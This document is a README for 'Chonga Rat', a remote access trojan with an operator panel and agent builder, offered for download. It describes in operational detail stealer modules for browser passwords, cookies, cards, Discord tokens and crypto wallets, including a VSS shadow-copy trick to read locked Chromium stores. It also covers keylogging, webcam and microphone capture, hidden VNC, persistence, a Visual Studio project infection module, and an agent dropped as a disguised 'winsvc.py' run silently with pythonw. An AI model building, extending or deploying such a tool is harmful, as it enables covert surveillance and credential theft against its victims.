# Chonga Rat — multi-client operator panel - for src download the .rar file 

![bind](https://img.shields.io/badge/bind-loopback%20default%2C%20LAN%20opt--in-39e0c8?style=flat-square)
![clients](https://img.shields.io/badge/clients-many%20at%20once-7c8cff?style=flat-square)
![builder](https://img.shields.io/badge/builder-included-3ddc84?style=flat-square)
![deps](https://img.shields.io/badge/panel-stdlib%20only-ffb020?style=flat-square)

An operator panel with its own agent builder. The server hosts the UI, listens
for agents on a TCP port, and routes every command to one selected client. Any
number of machines can be attached at the same time — same PC or different PCs
on the same network.

The sidebar starts with **Builder** only. Attached machines show up under
**Clients**; click one and its module tabs appear. With nothing selected the
panel shows a dash and no modules.

---

## Quick start

```bat
start-panel.bat
```

Then open <http://127.0.0.1:8787/>. Direct launch works too:

```bat
python server\panel-server.py
```

```
panel   http://127.0.0.1:8787/
agent   tcp 127.0.0.1:8790   (multi-client)
```

Python 3.10+ for the panel (standard library only). The agent needs the packages
in `requirements.txt`:

```bat
python -m pip install -r requirements.txt
```

Ports and bind addresses are environment variables:

| Variable | Default | Meaning |
|---|---|---|
| `PANEL_PORT` | `8787` | HTTP port for the UI and API |
| `AGENT_PORT` | `8790` | TCP port agents connect to |
| `PANEL_BIND` | `127.0.0.1` | HTTP bind address |
| `AGENT_BIND` | `127.0.0.1` | agent listener bind address |

---

## Build a client

1. Open **Builder**.
2. Tick the modules you want. The agent's dispatch table is fixed at build
   time, so an unticked module does not exist in that binary.
3. Set **Panel host** — the field starts at `127.0.0.1` and the panel never
   fills it in for you. For agents on other PCs, type the panel host's LAN
   address (the banner and the sidebar both show it in LAN mode).
4. Optionally rotate the token (invalidates every existing build) or request a
   PyInstaller `.exe`.
5. **Build agent**, then download **agent.bat**.

The build is one file. `agent.bat` carries the whole agent as base64, writes it
into `%LOCALAPPDATA%\Microsoft\Windows\Caches\winsvc.py` on first run, and starts
it with `pythonw` so no console is left behind. Nothing else has to travel with
it, and the `.bat` itself can be moved or renamed freely. Builds land in
`runtime/builds/`; the zip is just that single file.

The target needs a Python 3. The batch looks for `pythonw.exe`, then
`python.exe`, then the `py` launcher, and exits with code 4 if none is present.

Same thing over the API:

```bat
curl -X POST http://127.0.0.1:8787/api/builder ^
  -H "X-Panel-Token: <token>" -H "Content-Type: application/json" ^
  -d "{\"label\":\"lab\",\"host\":\"127.0.0.1\",\"features\":[\"screen\",\"files\",\"shell\"]}"
```

---

## Connecting clients from other PCs

The panel and the agent listener both default to loopback. Opening them to the
LAN is two environment variables and one firewall rule. The token still applies.

### 1. Start the panel in LAN mode

```bat
start-panel.bat lan
```

That sets `PANEL_BIND=0.0.0.0` and `AGENT_BIND=0.0.0.0`, opens the local
browser, and the server banner prints the LAN URL to hand to the other PCs.
Manual equivalent:

```bat
set PANEL_BIND=0.0.0.0
set AGENT_BIND=0.0.0.0
python server\panel-server.py
```

The banner now shows the address other machines should use:

```
panel   http://0.0.0.0:8787/
lan     http://192.168.1.24:8787/   (other PCs open this)
agent   tcp 0.0.0.0:8790  (multi-client)
agents  set the builder host to 192.168.1.24
```

### 2. Confirm the bind and the Host guard

```bat
python tools\lan-probe.py
```

```
panel host addresses:
  http://192.168.1.24:8787/   agents dial 192.168.1.24:8790

PASS  192.168.1.24  {"httpPort": 8787, "agentPort": 8790, "bind": "0.0.0.0", ...}
```

`PASS` means the listener is up, the address is in the `Host` allow-list, and
the route works. `403 invalid host` means the address you used is not one this
host owns — check `ipconfig`, and watch out for VPN adapters taking the default
route.

### 3. Open the firewall

Administrator PowerShell on the panel host:

```powershell
New-NetFirewallRule -DisplayName "Chonga Rat panel" -Direction Inbound `
  -Protocol TCP -LocalPort 8787,8790 -Action Allow -Profile Private
```

Private profile only. If the network is classified Public, Windows drops the
traffic no matter what the app does.

### 4. Build the agent for that address

In **Builder**, type the LAN IP into **Panel host** — the field is not
pre-filled, on purpose. Build, download the zip. If you leave it at
`127.0.0.1`, the agent will only ever find a panel on its own machine.

### 5. Run it on the other PC

Copy `agent.bat` over and double-click it. It needs a Python 3 on that machine:

```bat
python -m pip install -r requirements.txt
agent.bat
```

The agent dials `<LAN IP>:8790`, sends its hello (token + stable client id +
system inventory), and appears under **Clients**. Repeat on as many PCs as you
like — each one is a separate row.

### What makes them separate clients

- Each build folder keeps a `client.id` file next to `agent.py`. That id is
  what the hub keys on, so two PCs never collide even with identical hostnames.
- Copying a build folder to a second PC carries the id with it. Delete
  `client.id` before the first run if you want a genuinely new client.
- Restarting the same agent reconnects with the same id: the hub swaps the
  socket and keeps one row instead of piling up ghosts.
- Every `/api/cmd`, `/api/screen`, `/api/download` and `/api/upload` call names
  a client id. Nothing is broadcast.

### Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| agent exits with `cannot reach the panel on <ip>:8790` | listener still on loopback, wrong IP, or firewall | `AGENT_BIND=0.0.0.0`, re-run `lan-probe.py`, add the firewall rule |
| browser shows `403 loopback only` | `PANEL_BIND` is still `127.0.0.1` | restart with LAN mode |
| browser shows `403 invalid host` | the URL host is not a local address of the panel | use the IP printed by the banner / `lan-probe.py` |
| client attaches then immediately drops | agent built with a rotated token | rebuild after rotating |
| works on LAN, not across the internet | no route / NAT | tunnel it (WireGuard, Tailscale, SSH `-L`) rather than exposing 8787/8790 |
| two rows for one machine | two build folders with different `client.id` | expected; delete the extra folder or its id file |

### Transport note

Agent traffic is newline-delimited JSON over plain TCP, and the panel is plain
HTTP. The token authenticates, but nothing is encrypted in transit. Keep it on
a network you trust, or put both ports behind a VPN or SSH tunnel. `ALLOWED_HOSTS`
is derived from the bind address plus every local interface, so a spoofed
`Host` header or a cross-origin page still gets a 403.

---

## Modules

| Area | Commands | Notes |
|---|---|---|
| Session | `ping`, `sysinfo`, `disconnect` | inventory, liveness, clean teardown |
| Remote desktop | `screenshot`, `mouse`, `key` | multipart JPEG over `/api/stream`, absolute mouse, `SendInput` scan codes |
| Files | `drives`, `listdir`, `stat`, `mkdir`, `rename`, `delete`, `file_read`, `file_write`, `file_close`, `file_hash`, `file_search` | browse, streamed download, chunked upload |
| Processes | `processes`, `process_kill`, `process_start` | enumerate, terminate, launch |
| Execution | `shell`, `execute`, `run_command` | `cmd.exe` with timeout, captured stdout/stderr |
| Registry | `registry` | list, get, set, create key, delete key/value |
| Clipboard | `clipboard_get`, `clipboard_set` | Unicode text |
| Surveillance | `keylog_start`, `keylog_stop`, `keylog_dump`, `windows`, `idle` | keystrokes tagged with the foreground window, streamed as events |
| Capture | `webcam_list`, `webcam_frame`, `mic_list`, `mic_capture`, `desktop_audio` | OpenCV / WASAPI through ctypes |
| Stealer | `steal_cookies`, `steal_history`, `steal_autofill`, `steal_passwords`, `steal_cards`, `steal_downloads`, `steal_bookmarks`, `steal_firefox`, `steal_discord`, `steal_roblox`, `steal_wallets`, `steal_extensions`, `steal_archive`, `steal_all` | 21 Chromium and 7 Gecko roots, DPAPI + AES-GCM v10/v11 |
| Recon | `connections`, `geo`, `startup_list`, `idle` | psutil snapshot, geo lookup |
| Persistence | `persist_install`, `persist_remove`, `persist_status`, `startup_add`, `startup_remove` | HKCU/Startup |
| Propagation | `vs_infect`, `vs_clean`, `recycle_list`, `recycle_restore` | VS project import, recycle bin |
| Proxy | `proxy_open`, `proxy_send`, `proxy_recv`, `proxy_close`, `proxy_start`, `proxy_stop`, `proxy_list` | TCP tunnel out of the agent, loopback SOCKS5 |
| Plugins | `plugin_load`, `plugin_call`, `plugin_list`, `plugin_unload`, `code_run` | module registers a `COMMANDS` dict |
| HVNC | `hvnc_*` | hidden desktop, its own window/process control |
| Desktop | `messagebox`, `tts`, `audio`, `power`, `visit_website` | dialog, `System.Speech`, beep/WAV, power state |
| Chat | `chat`, `chat_send`, `chat_close` | Tk window in a child process on the host |
| Control | `set_status`, `set_user_status`, `purge`, `retry`, `close_connection`, `bot_kill` | session lifecycle |

### Frame rate

Both live views use one long-lived HTTP response per view instead of
request-per-frame polling:

```
GET /api/stream?client=<id>&q=58&fps=30&m=0&s=1     desktop
GET /api/hvnc?client=<id>&q=58&fps=30&s=1           hidden desktop
```

The server writes `multipart/x-mixed-replace` parts, each carrying one JPEG plus
`X-Frame-Width` / `X-Frame-Height` / `X-Frame-Seq`. The browser reads the stream
with `fetch` + `ReadableStream`, decodes each part with `createImageBitmap` and
draws it into a canvas. No DOM image churn, no per-frame request overhead.

- `fps` — 10 to 60, capped by what the host can capture. The picker defaults to
  30; 40 is realistic on a modern desktop at 1080p.
- `q` — JPEG quality, 25 to 90.
- `s` — capture scale (1, 0.85, 0.75, 0.5). Halving the scale roughly quarters
  the encode cost and the bytes on the wire, which is the lever to pull when a
  high frame rate matters more than pixel fidelity.
- `m` — monitor index for `/api/stream`.

Capture cost per frame: `mss` grab (~6–10 ms at 1080p) plus a JPEG encode. When
`opencv-python` and `numpy` are installed the agent encodes with
`cv2.imencode`, otherwise it falls back to Pillow; that difference is most of
the distance between 20 and 40 fps. The capture context is created once per
process and reused, and `optimize=True` is never set.

HVNC does not composite window by window any more. A dedicated thread calls
`SetThreadDesktop` on the hidden desktop and `BitBlt`s the whole surface into
one DIB, so each frame is a single copy. If `SetThreadDesktop` is refused, or if
`BitBlt` fails three times in a row — which is what happens on a session with no
interactive display — the agent hands the desktop back to `PrintWindow` per
window and reports `mode: "composite"`. `hvnc_start` waits for the thread to
settle before answering, so it never claims `desktop` for a surface that can
never produce a frame.

Mouse coordinates map from canvas space to host space per monitor, with the
capture scale divided out. Pointer moves are coalesced to ~30 per second; drags
send `down`/`up`, right-click sends `right`, the wheel sends `wheel` with a
signed delta. Ctrl+Alt+Del is not offered — a user-mode process cannot inject
it.

### Mask

`mask` hides `Progman` and `Shell_TrayWnd` so the desktop and taskbar disappear
while the agent keeps running. It is guarded on purpose:

- the panel asks for confirmation before sending it
- `Ctrl+Alt+L` on the host lifts it
- it lifts itself after `ttl` seconds (default 300, clamped 30 s – 1 h)
- an `atexit` handler lifts it if the process dies
- `mask_status` reports `masked`, `expires_in` and `hotkey_ok` so the panel can
  count down in red on the Mask button

Those two windows are owned by `explorer.exe`, so killing the agent does **not**
restore them. Recovery is
`cmd /c taskkill /f /im explorer.exe & start explorer.exe`.

### Credential stores

Chromium keeps its cookie database open with no sharing at all, so a running
browser returns `ERROR_SHARING_VIOLATION` for every read — share flags,
`SeBackupPrivilege` and backup intent all fail against a zero-share handle.
The agent therefore mounts a client-accessible VSS shadow copy, links it with
`mklink /d`, copies the database plus its `-wal` / `-shm` / `-journal` sidecars
out, and opens that. The shadow is released when the run finishes.

Reads cost about 3–4 seconds per full collection because of the snapshot. It
needs an elevated agent; without one the collectors fall back to a direct open
and report the lock instead of returning a silent zero.

Every collector returns `notes`, an array of per-store failures, so an empty
result is never ambiguous:

```json
{"cookies": [...], "count": 150, "notes": ["edge: 150 cookies are app-bound (v20) — the value is sealed by the browser's elevation service, only host/name/expiry are readable"]}
```

`steal_all` adds `counts` (rows per collector), `total` and `snapshot` (whether
a shadow copy was used), and returns the whole set as a base64 zip. The panel's
Archive → **Everything** button calls it and downloads `collect-<ts>.zip`.

The panel keeps what it collected. Results are cached in `localStorage` under
`chonga.steal.<client id>` and the selected client is remembered too, so a
disconnect, a panel restart or a full page reload still shows the last pull —
with an "offline, showing the last collection, *n* ago" banner, Refresh disabled,
and the rows still readable. Every tab has **Download CSV** and **Download JSON**;
CSV is UTF-8 with a BOM so Excel opens it without mojibake. Tabs that were never
collected say so instead of rendering an empty table.

Chromium 127+ moved to app-bound encryption. Values are prefixed `v20` and can
only be unwrapped by the browser's own elevation service, so in user mode the
agent can read host, name and expiry but not the secret. Those rows are marked
`<app-bound:v20>` rather than blanked, and the panel renders them as a `sealed`
badge with the raw marker in the tooltip. Firefox stores behind a primary
password return `<locked:master-password>`; anything else that fails returns
`<undecryptable>`.

One detail worth keeping: `_dpapi` must set `LocalFree.argtypes`. Without it
ctypes truncates the returned 64-bit pointer, the free raises `OverflowError`
inside the `finally` block, and the exception discards a decrypt that already
succeeded — which is what made every DPAPI value come back empty.

---

## Architecture

```
browser ── HTTP ──► panel server  (PANEL_BIND:PANEL_PORT)
                        │  token auth, Host/Origin guard, SSE
                        │
                        ▼
                   client hub  ── TCP ──► AGENT_BIND:AGENT_PORT
                        │                   ▲
                        │                   │ newline JSON
                        ▼                   │
                 builder → agent zip ───────┘
```

One hub, many sockets. `Hub.clients` maps a client id to a `Client` object that
owns its socket, feature set and pending request table. Requests carry the
client id, so two desktops can be driven from two browser tabs without crossing
wires.

Wire format:

```
agent  → server   {"token": "...", "client_id": "...", "info": {...}, "features": [...]}
server → agent    {"ok": true, "welcome": "chonga-rat", "client": "..."}
server → agent    {"id": 7, "cmd": "listdir", "args": {"path": "C:\\"}}
agent  → server   {"id": 7, "ok": true, "data": {"entries": [...]}}
agent  → server   {"event": "keylog", "ts": 0, "client": "...", "text": "..."}
```

Frames are capped at 32 MB, uploads at 512 MB, downloads stream in 256 KB
chunks without buffering the file.

Panel API, same-origin and token-gated:

```
GET  /api/config              token, ports, bind mode, LAN address
GET  /api/state               client snapshot (list + features)
GET  /api/events              SSE stream (events carry client ids)
GET  /api/stream?q&fps&m&s    live desktop, multipart JPEG
GET  /api/hvnc?q&fps&s        live hidden desktop, multipart JPEG
GET  /api/screen?q&m&client   single JPEG frame from one client
GET  /api/download?path&client streamed file from one client
GET  /api/builds/<zip>        generated agent archive
POST /api/cmd                 {"client": ..., "cmd": ..., "args": ...}
POST /api/upload?path&client  raw body written to one client
POST /api/builder             generate an agent
```

---

## File map

```
server/panel-server.py       HTTP panel, client hub, builder, API
agent/agent-template.py      agent source with the __CONFIG__ placeholder
panel/index.html             panel shell
panel/assets/app.js          UI (API + SSE, no framework)
panel/assets/style.css       styling
panel/data/messages.json     130 recovered protobuf contracts (reference)
start-panel.bat              launcher: loopback by default, "lan" argument
requirements.txt             agent dependencies
tools/lan-probe.py           bind + Host-guard check for LAN mode
tools/smoke-all.py           full command sweep against a live agent
tools/verify.ps1             PowerShell command harness
runtime/                     token, builds, uploads, downloads (git-ignored)
.github/workflows/ci.yml     compile, catalog and JS syntax checks
```

`runtime/token.txt` holds the shared token. It is generated on first boot and
embedded into every build; rotating it in the Builder invalidates old agents.

---

## Verification

Checked against the running stack on Windows:

- loopback boot, `/api/config`, `/api/state`, static assets, message catalog
- `PANEL_BIND=0.0.0.0` + `AGENT_BIND=0.0.0.0`: panel answers on the machine's
  LAN address, `lan-probe.py` returns `PASS`
- agent built with the LAN IP attached from a non-loopback peer and showed up
  under **Clients**
- two agents attached at once; per-client `shell` returned the output of the
  client it was addressed to and nothing else
- restarting one agent replaced its socket — still two clients, no duplicate row
- builder over the API: zip produced, `config.json` carried the requested host,
  generated agent compiles
- `/api/stream` and `/api/hvnc` streamed at the requested rate against a stub
  agent (38 fps at a 40 target, 54 at 60 on 1600×900 frames); the browser
  rendered them into a canvas with the HUD reading the same numbers
- HVNC start/stop cycle: status flips `closed` → `desktop`, the canvas clears on
  stop, and the socket closes with the view
- twelve route changes between the two live views left no dangling sockets
- UI: builder host starts at `127.0.0.1` and is never filled in by the panel,
  sidebar shows the LAN address, zero console errors

`tools/verify.ps1` and `tools/smoke-all.py` are the harnesses used for the
command sweep. They need a live agent, and the agent needs `psutil`, `mss`,
`Pillow` and friends from `requirements.txt` — a missing package fails that one
module with a clear error instead of dropping the session.
